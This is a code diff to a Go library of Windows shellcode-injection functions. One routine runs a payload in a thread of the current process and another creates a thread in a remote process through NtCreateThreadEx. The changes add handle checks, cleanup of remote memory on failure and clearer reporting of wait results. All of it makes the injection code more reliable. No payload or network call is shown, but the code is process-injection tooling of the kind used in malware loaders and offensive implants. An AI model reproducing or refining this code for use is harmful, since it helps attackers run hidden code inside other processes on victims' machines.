@@ -1748,22 +1748,34 @@ func OriginalNtInjectSelfShellcode(payload []byte) error {
 		return fmt.Errorf("NtCreateThreadEx failed: %v %s", err, FormatNTStatus(status))
 	}
 
+	// Validate thread handle
+	if hThread == 0 {
+		return fmt.Errorf("NtCreateThreadEx returned invalid handle")
+	}
+
 	debug.Printfln("WINAPI", "Thread created successfully: 0x%X\n", hThread)
 	
 	// Wait for thread to complete execution
 	debug.Printfln("WINAPI", "Waiting for thread to complete...\n")
 	
-	// Wait for the thread with a timeout (10 seconds to be safe)
-	timeout := uint64(10000 * 1000 * 10) // 10 seconds in 100ns units
+	// Wait for the thread with a timeout (10 seconds relative timeout)
+	timeout := TIMEOUT_10_SECONDS
+	
 	waitStatus, err := NtWaitForSingleObject(hThread, false, &timeout)
 	if err != nil {
 		debug.Printfln("WINAPI", "Warning: Wait failed: %v\n", err)
 	} else {
-		debug.Printfln("WINAPI", "Thread wait completed with status: %s\n", FormatNTStatus(waitStatus))
+		switch waitStatus {
+		case WAIT_OBJECT_0:
+			debug.Printfln("WINAPI", "Thread completed successfully\n")
+		case WAIT_TIMEOUT:
+			debug.Printfln("WINAPI", "Thread wait timed out after 10 seconds\n")
+		case WAIT_FAILED:
+			debug.Printfln("WINAPI", "Thread wait failed\n")
+		default:
+			debug.Printfln("WINAPI", "Thread wait completed with status: %s (0x%X)\n", FormatNTStatus(waitStatus), waitStatus)
+		}
 	}
-	
-	// Give it a moment and then clean up
-	time.Sleep(1 * time.Second)
 	
 	// Close the thread handle
 	closeStatus, err := NtClose(hThread)
@@ -1906,7 +1918,17 @@ func NtInjectRemote(processHandle uintptr, payload []byte) error {
 	
 	debug.Printfln("WINAPI", "Created remote thread: 0x%X\n", hThread)
 
-	// Step 5: Close thread handle immediately 
+	// Validate thread handle
+	if hThread == 0 {
+		// Cleanup on failure
+		freeSize := uintptr(0)
+		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
+		return fmt.Errorf("NtCreateThreadEx returned invalid handle")
+	}
+	
+	debug.Printfln("WINAPI", "Remote thread created successfully: 0x%X\n", hThread)
+
+	// Step 5: Close thread handle (we don't wait for remote threads to avoid hanging)
 	closeStatus, err := NtClose(hThread)
 	if err != nil || closeStatus != STATUS_SUCCESS {
 		debug.Printfln("WINAPI", "Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
